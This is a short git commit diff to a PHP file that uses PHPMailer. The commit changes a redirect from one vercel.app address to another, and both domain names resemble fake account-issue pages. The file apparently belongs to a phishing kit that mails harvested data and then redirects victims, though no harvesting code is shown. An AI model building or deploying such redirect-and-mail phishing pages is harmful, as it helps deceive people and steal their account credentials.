d7650c9f036a059342d77f56378eb8bfde5116c3
Ghaliya3399 <ghaliyaaliyounisaneza@gmail.com>
2025-08-31 15:52:21 +0500

    Update Dada1.php

--- Dada1.php
+++ Dada1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://page-contact-account-infe.vercel.app/");
+header("Location: https://account-issues-from.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
